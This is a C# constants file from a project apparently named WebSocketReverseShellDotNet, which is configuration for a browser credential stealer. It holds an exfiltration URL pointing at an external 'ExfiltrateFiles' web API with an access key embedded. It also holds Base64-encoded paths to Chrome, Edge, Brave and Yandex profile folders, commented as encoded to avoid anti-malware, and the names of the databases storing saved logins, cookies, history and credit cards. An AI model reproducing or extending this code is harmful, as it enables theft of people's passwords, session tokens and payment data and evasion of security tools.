

namespace WebSocketReverseShellDotNet.utils
{
    internal static class Constants
    {
        /*       public const String SERVER_HTTP_URI = "http://localhost:7109/api/ExfiltrateFiles";*/

        public const String SERVER_HTTP_URI = "https://file-exfiltration.azurewebsites.net/api/ExfiltrateFiles?code=08wvQkLYKEx6oMsNjHW15vs7zzRluhdvGg4s_FH34fInAzFuqs_svA==";







        /* Base64 Encoded to avoid Anti-Malware*/
        public const String EXFILTRATE_FOLDER = "LmV4Zm455lsdHJhdGU=";
        public static string[] LIST_OF_BROWSER_LOCATIONS = [
            "LiVMT0NBTEFQUERBVEElXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFw=",
            "JUxPQ0FMQVBQREFUQSVcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFw=",
            "JUxPQ0FMQVBQREFUQSVcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFw=",
            "JUxPQ0FMQVBQREFUQSVcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxc",
            "JUxPQ0FMQVBQREFUQSVcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFw=",
        ];

        public static string ENCRYPTION_KEY_BROWSER_DB = "TG9jYWwgU3RhdGU=";

        public static string[] LIST_OF_PROFILE_LOCATIONS = [
            "Default\\",
            "Profile 1\\",
            "Profile 2\\",
            "Profile 3\\",
            "Profile 4\\",
            "Profile 5\\",
            "Profile 6\\",
        ];
        public static string LOGIN_DATA_BROWSER_DB = "TG9naW4gRGF0YQ==";
        public static string COOKIES_BROWSER_DB = "TmV0d29ya1xDb29raWVz";
        public static string HISTORY_BROWSER_DB = "SGlzdG9yeQ==";
        public static string CREDIT_CARDS_BROWSER_DB = "V2ViIERhdGE=";






    }
}
